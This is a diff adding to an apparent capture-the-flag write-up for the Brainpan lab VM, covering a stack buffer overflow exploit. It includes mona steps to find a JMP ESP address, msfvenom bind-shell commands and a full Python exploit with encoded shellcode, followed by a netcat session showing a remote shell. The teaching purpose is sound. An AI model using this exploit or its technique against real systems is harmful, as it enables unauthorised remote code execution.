@@ -441,9 +441,115 @@ s.send(string + '\r\n')
 s.close()
 ```
 
-I am using the character list four times so that it crashes the application and it's easy for us to find these characters in stack. Now if we match the payload characters with the stack ones, nothing is escaped actually. So we don't have to worry about any bad characters. 
+I am using the character list four times so that it crashes the application and it's easy for us to find these characters in stack. Now if we match the payload characters with the stack ones, nothing is escaped actually. So we don't have to worry about any bad characters, we can only remove the null bytes (x00) from the payload. If the application reject any character then we need to encode our paylaod, and the decoding would take place on the stack which need some extra bytes, so having some no operations (typically 16-bytes) is a good practice, it will also give some room for malicious code to get decoded, otherwise it may overflow to our return address.  
 
 ![bad](https://github.com/azizahsan/Buffer-Overflow/blob/master/bad.png?raw=true)
+
+
+So our payload can be look like follows:
+
+```
+524 bytes of random string + return address + some no operations + malcious code
+
+```
+
+As we can see in the memory dump that the address where ESP is pointing to is a good place to put our malicious code. So, we need to jump ESP, we cannot hardcode ESP's address as return address, we need to find a statement where we can jump which then jump to ESP. Makes sense?
+
+We can do this by using mona modules in immunity debugger, first step is to see which process has [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) turned off, to do that we type "!mona modules" in debugger:
+
+![aslr](https://github.com/azizahsan/Buffer-Overflow/blob/master/aslr.png?raw=true)
+
+ASLR is false for brainpan.exe, we can find "JMP ESP" in brainpan.exe and use the address of that statement as our return address. The code for "JMP ESP" is (FFE4):
+
+```
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
+nasm > jmp esp
+00000000 FFE4 jmp esp
+nasm > 
+```
+
+Let's search this using mona (note I am running mona commands after crashing the app):
+
+![find](https://github.com/azizahsan/Buffer-Overflow/blob/master/find.png?raw=true)
+
+We've got one JMP ESP address: 0x311712F3.
+
+Now our payload would become:
+
+```
+524 bytes of random string + 0x311712F3 + 16 bytes of no operations + malicous code
+
+```
+
+I am adding 16-bytes of no operations as I am using encoding to avoid null bytes in the paylaod. The malicious code can be anything, I am using a bidn shell, it will open port 4444 where we can connect. The msfvenom command for this is (-b is for bad character "\x00" and "x86/shikata_ga_nai" is the encoding we're using):
+
+```
+msfvenom -p windows/shell_bind_tcp LPORT=4444 -f c -b "\x00" –e x86/shikata_ga_nai
+```
+Our final code would look like as follows:
+
+```
+#!/usr/bin/python
+import socket
+
+#return address = x311712f3
+retaddr = "\xf3\x12\x17\x31"
+
+shellcode = ("\xda\xc8\xba\x7e\x7a\xbe\x0e\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
+"\x53\x31\x56\x17\x83\xc6\x04\x03\x28\x69\x5c\xfb\x28\x65\x22"
+"\x04\xd0\x76\x43\x8c\x35\x47\x43\xea\x3e\xf8\x73\x78\x12\xf5"
+"\xf8\x2c\x86\x8e\x8d\xf8\xa9\x27\x3b\xdf\x84\xb8\x10\x23\x87"
+"\x3a\x6b\x70\x67\x02\xa4\x85\x66\x43\xd9\x64\x3a\x1c\x95\xdb"
+"\xaa\x29\xe3\xe7\x41\x61\xe5\x6f\xb6\x32\x04\x41\x69\x48\x5f"
+"\x41\x88\x9d\xeb\xc8\x92\xc2\xd6\x83\x29\x30\xac\x15\xfb\x08"
+"\x4d\xb9\xc2\xa4\xbc\xc3\x03\x02\x5f\xb6\x7d\x70\xe2\xc1\xba"
+"\x0a\x38\x47\x58\xac\xcb\xff\x84\x4c\x1f\x99\x4f\x42\xd4\xed"
+"\x17\x47\xeb\x22\x2c\x73\x60\xc5\xe2\xf5\x32\xe2\x26\x5d\xe0"
+"\x8b\x7f\x3b\x47\xb3\x9f\xe4\x38\x11\xd4\x09\x2c\x28\xb7\x45"
+"\x81\x01\x47\x96\x8d\x12\x34\xa4\x12\x89\xd2\x84\xdb\x17\x25"
+"\xea\xf1\xe0\xb9\x15\xfa\x10\x90\xd1\xae\x40\x8a\xf0\xce\x0a"
+"\x4a\xfc\x1a\xa6\x42\x5b\xf5\xd5\xaf\x1b\xa5\x59\x1f\xf4\xaf"
+"\x55\x40\xe4\xcf\xbf\xe9\x8d\x2d\x40\x04\x12\xbb\xa6\x4c\xba"
+"\xed\x71\xf8\x78\xca\x49\x9f\x83\x38\xe2\x37\xcb\x2a\x35\x38"
+"\xcc\x78\x11\xae\x47\x6f\xa5\xcf\x57\xba\x8d\x98\xc0\x30\x5c"
+"\xeb\x71\x44\x75\x9b\x12\xd7\x12\x5b\x5c\xc4\x8c\x0c\x09\x3a"
+"\xc5\xd8\xa7\x65\x7f\xfe\x35\xf3\xb8\xba\xe1\xc0\x47\x43\x67"
+"\x7c\x6c\x53\xb1\x7d\x28\x07\x6d\x28\xe6\xf1\xcb\x82\x48\xab"
+"\x85\x79\x03\x3b\x53\xb2\x94\x3d\x5c\x9f\x62\xa1\xed\x76\x33"
+"\xde\xc2\x1e\xb3\xa7\x3e\xbf\x3c\x72\xfb\xcf\x76\xde\xaa\x47"
+"\xdf\x8b\xee\x05\xe0\x66\x2c\x30\x63\x82\xcd\xc7\x7b\xe7\xc8"
+"\x8c\x3b\x14\xa1\x9d\xa9\x1a\x16\x9d\xfb")
+
+string = "A"*524 + retaddr + "\x90"*16 + shellcode
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect=s.connect(('192.168.56.103',9999))
+s.recv(1024)
+s.send(string + '\r\n')
+s.close()
+```
+
+After running the above code, we can connect via netcat:
+
+```
+root@kali:~/Downloads# ./windows-poc.py
+root@kali:~/Downloads# nc -nv 192.168.56.103 4444
+(UNKNOWN) [192.168.56.103] 4444 (?) open
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\IEUser\Desktop>
+
+```
+As brainpan is linux, we need to generate shellcode for linux:
+
+```
+msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00" –e x86/shikata_ga_nai
+```
+
+We just replace the shell code and run against the brainpan vm, and we'll be able to get shell. For, this code file is uploaded (linux-poc.py). 
+
+
 
 
 
